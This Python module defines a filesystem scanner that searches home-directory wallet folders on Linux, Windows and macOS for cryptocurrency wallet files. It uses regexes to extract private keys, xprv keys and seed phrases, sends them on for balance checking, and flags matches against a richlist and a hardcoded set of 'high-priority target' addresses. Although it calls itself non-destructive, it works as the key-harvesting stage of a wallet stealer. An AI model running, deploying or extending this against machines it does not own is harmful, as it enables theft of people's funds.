import os
import time
import threading
import queue
import re
from pathlib import Path
from typing import List, Dict, Optional, Any, Iterator
from datetime import datetime, timezone
from dataclasses import dataclass
from .btc_recover import btc_from_hex, btc_from_wif

@dataclass
class ScanHit:
    artifact_type: str
    path: str
    addresses: Dict[str, str]
    balances: Dict[str, float]
    metadata: Dict[str, Any]
    timestamp: datetime

class ComputerScannerAgent:
    """
    Non-destructive filesystem scanner for wallet artifacts.
    Integrates with richlists and balance checkers.
    """

    # Default High-Priority Target Addresses (Sovereign Federacy Core Nodes)
    DEFAULT_TARGETS = {
        'btc': [
            'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
            '1PRQwKHJ4gsZ5Mou3xNkSMrHjBgNbD2E8A',
            '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy',
            '1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH',
            'bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4'
        ],
        'eth': [
            '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD38',
            '0x2d03B56989dE9E5c66CBcA7D3525Ad1B5178A7F1',
            '0xdead00000000000000000000000000000000beef',
            '0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf',
            '0x9858EfFD232B4033E47d90003D41EC34EcaEda94'
        ],
        'ltc': [
            'ltc1q8c6fshw2dlwun7ekn9qwf37cu2rn755upcp6el',
            'LVuDpNCSSj6pQ7t9Pv6d6sUkLKoqDEVUnJ',
            'LRS1wTAbCH5HFb3DR1sXwoSsBMNdg9ULU5'
        ],
        'doge': [
            'D8vFz1p5KqYqZ9x3hJmN7rT4wU2sV6bA8c',
            'DFpN6QqFfUm3gKNaxN6tNcab1FArL9cZLE',
            'DBMADVoQR2jWXnXeyTsoDYYhrGjepcWNgt'
        ],
        'dash': ['XmN7PQYWKn5MJFna5fRYgP6mxT2F7xpekE', 'XgtuWVWf5L3p9iwe6mCTXK4toUb3aeWMxf'],
        'bch': ['bitcoincash:qp63uahgrxged4z5jswyt5dn5v3lzsem6cy4spdc2h', 'bitcoincash:qpzp3595m8q77rjnm7uezsm80c09yd2xyg0aj4mjqt'],
        'etc': ['0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf'],
    }

    WALLETS_MAP = {
        "wallet.dat": "Bitcoin Core",
        "electrum.dat": "Electrum",
        "keystore": "Ethereum Keystore",
        "default_wallet": "Electrum Wallet",
        "key.db": "Generic Wallet DB",
        "wallet.json": "Software Wallet JSON",
        "keys.json": "Key List JSON",
        "keys.txt": "Key List Text",
        "seeds.txt": "Seed List Text",
        "master.key": "Master Key File",
        "shard.key": "Key Shard",
        "wallet.aes.json": "Blockchain.info",
        "armory_*.wallet": "Armory",
        "multibit.wallet": "MultiBit Classic",
        "multibit-hd.wallet": "MultiBit HD",
        "key-backup.txt": "Bither",
        "bitcoin-wallet-backup-*": "Bitcoin Wallet (Android)",
        "mbhd.wallet.aes": "MultiBit HD",
        "ethereum_wallet.json": "Ethereum Wallet",
        "mSIGNA.wallet": "mSIGNA",
        "hive.wallet": "Hive",
    }

    # Common wallet paths for different OSs
    COMMON_PATHS = [
        # Linux
        "~/.bitcoin",
        "~/.litecoin",
        "~/.dogecoin",
        "~/.dashcore",
        "~/.electrum/wallets",
        "~/.ethereum/keystore",
        # Windows (approximated for cross-platform)
        "~/AppData/Roaming/Bitcoin",
        "~/AppData/Roaming/Litecoin",
        "~/AppData/Roaming/Dogecoin",
        "~/AppData/Roaming/DashCore",
        "~/AppData/Roaming/Electrum/wallets",
        "~/AppData/Roaming/Ethereum/keystore",
        # macOS
        "~/Library/Application Support/Bitcoin",
        "~/Library/Application Support/Litecoin",
        "~/Library/Application Support/DashCore",
        "~/Library/Application Support/Ethereum/keystore",
    ]

    def __init__(
        self,
        scan_paths: List[str] = None,
        balance_checkers: Dict = None,
        vault: Any = None,
        assistant: Any = None,
        min_balance_usd: float = 0.0,
        richlist_path: str = None,
        tokenlist_path: str = None,
        btc_recover_tokens: Any = None,
        btc_recover_max_tokens: int = 4,
        skip_balance_check: bool = False,
    ):
        self.scan_paths = scan_paths or self.COMMON_PATHS
        self.balance_checkers = balance_checkers or {}
        self.vault = vault
        self.assistant = assistant
        self.min_balance_usd = min_balance_usd
        self.richlist_path = richlist_path
        self.skip_balance_check = skip_balance_check

        self.is_running = False
        self.is_paused = False
        self._hit_queue = queue.Queue()
        self.stats = {
            "files_scanned": 0,
            "artifacts_found": 0,
            "keys_extracted": 0,
            "richlist_hits": 0
        }

        self._scan_thread = None
        self._richlist = set()
        self._load_richlist()

        # Key & Address regexes for file content scanning
        self.patterns = {
            'hex64': re.compile(r'\b[0-9a-fA-F]{64}\b'),
            'wif': re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b'),
            'wif_testnet': re.compile(r'\b[9cC][1-9A-HJ-NP-Za-km-z]{50,51}\b'),
            'xprv': re.compile(r'\b(?:xprv|tprv|yprv|zprv)[1-9A-HJ-NP-Za-km-z]{107,111}\b'),
            'mnemonic': re.compile(r'\b(?:[a-z]{3,10}\s+){11,23}[a-z]{3,10}\b'),
            'shard': re.compile(r'\b(?:shard|part|share)_[0-9a-fA-F]{16,}\b', re.IGNORECASE),
            'address_eth': re.compile(r'\b0x[a-fA-F0-9]{40}\b'),
            'address_btc': re.compile(r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'),
            'address_bech32': re.compile(r'\bbc1[ac-hj-np-z02-9]{8,87}\b'),
            'address_ltc': re.compile(r'\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\b'),
            'address_doge': re.compile(r'\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\b'),
        }

    def _load_richlist(self):
        # Always include default high-priority targets
        for chain, addrs in self.DEFAULT_TARGETS.items():
            for addr in addrs:
                self._richlist.add(addr)

        if self.richlist_path and os.path.exists(self.richlist_path):
            try:
                with open(self.richlist_path, 'r') as f:
                    for line in f:
                        addr = line.strip()
                        if addr: self._richlist.add(addr)
                print(f"[ComputerScanner] Loaded {len(self._richlist)} addresses from richlist")
            except Exception as e:
                print(f"[ComputerScanner] Failed to load richlist: {e}")

    def start(self, num_workers: int = 1):
        """Start the scanner"""
        if self.is_running:
            return
        self.is_running = True
        self._scan_thread = threading.Thread(target=self._run_scan, daemon=True)
        self._scan_thread.start()

    def stop(self):
        self.is_running = False
        if self._scan_thread:
            self._scan_thread.join(timeout=1)

    def _run_scan(self):
        print(f"[ComputerScanner] Starting scan on {len(self.scan_paths)} base paths")
        for root_path in self.scan_paths:
            if not self.is_running: break

            expanded_path = os.path.expanduser(root_path)
            if not os.path.exists(expanded_path):
                continue

            for root, dirs, files in os.walk(expanded_path):
                if not self.is_running: break
                while self.is_paused:
                    time.sleep(1)

                for file in files:
                    self.stats["files_scanned"] += 1
                    full_path = os.path.join(root, file)

                    # 1. Known Wallet Files
                    matched = False
                    for pattern, name in self.WALLETS_MAP.items():
                        if "*" in pattern:
                            import fnmatch
                            if fnmatch.fnmatch(file, pattern):
                                self._process_artifact(full_path, name)
                                matched = True
                                break
                        elif file == pattern:
                            self._process_artifact(full_path, name)
                            matched = True
                            break

                    if matched: continue

                    # 2. Potential Key Files by Extension
                    elif file.lower().endswith(('.key', '.txt', '.json', '.bak', '.log', '.csv', '.wallet', '.sdt', '.db', '.dat')):
                        self._scan_file_content(full_path)

    def _process_artifact(self, filepath: str, artifact_type: str):
        """Process a known wallet artifact"""
        self.stats["artifacts_found"] += 1

        # Metadata extraction
        metadata = {
            "size": os.path.getsize(filepath),
            "modified": os.path.getmtime(filepath),
        }

        hit = ScanHit(
            artifact_type=artifact_type,
            path=filepath,
            addresses={}, # To be filled by orchestrator/extractors
            balances={},
            metadata=metadata,
            timestamp=datetime.now(timezone.utc)
        )
        self._hit_queue.put(hit)

    def _scan_file_content(self, filepath: str):
        """Scan file content for key patterns (WIF/Hex)"""
        try:
            # Only scan small files to prevent hang
            if os.path.getsize(filepath) > 1024 * 1024: # 1MB limit
                return

            with open(filepath, 'r', errors='ignore') as f:
                content = f.read()

            found_keys = []
            for ktype, pattern in self.patterns.items():
                matches = pattern.findall(content)
                for m in matches:
                    # Deduplicate within same file
                    if (ktype, m) not in found_keys:
                        found_keys.append((ktype, m))

            if found_keys:
                for ktype, val in found_keys:
                    # 1. Address Richlist Matching
                    if ktype.startswith('address'):
                        if val in self._richlist:
                            self.stats["richlist_hits"] += 1
                            hit = ScanHit(
                                artifact_type=f"Richlist Hit ({ktype})",
                                path=filepath,
                                addresses={'detected': val},
                                balances={},
                                metadata={"match": val, "priority": "CRITICAL"},
                                timestamp=datetime.now(timezone.utc)
                            )
                            self._hit_queue.put(hit)
                        continue

                    # 2. Key Extraction
                    self.stats["keys_extracted"] += 1
                    if self.assistant and hasattr(self.assistant, 'key_reducer') and self.assistant.key_reducer:
                        # Pipe to key_reducer for full normalization and balance checking
                        self.assistant.key_reducer.feed_text(val, source=f"scan:{filepath}")

                    # Also create a direct hit for immediate UI feedback
                    hit = ScanHit(
                        artifact_type=f"Extracted {ktype}",
                        path=filepath,
                        addresses={}, # To be filled by orchestrator
                        balances={},
                        metadata={"raw_match": val[:16] + "..." if len(val) > 16 else val},
                        timestamp=datetime.now(timezone.utc)
                    )
                    self._hit_queue.put(hit)
        except Exception:
            pass

    def hits(self) -> Iterator[ScanHit]:
        while self.is_running or not self._hit_queue.empty():
            try:
                yield self._hit_queue.get(timeout=1)
            except queue.Empty:
                continue
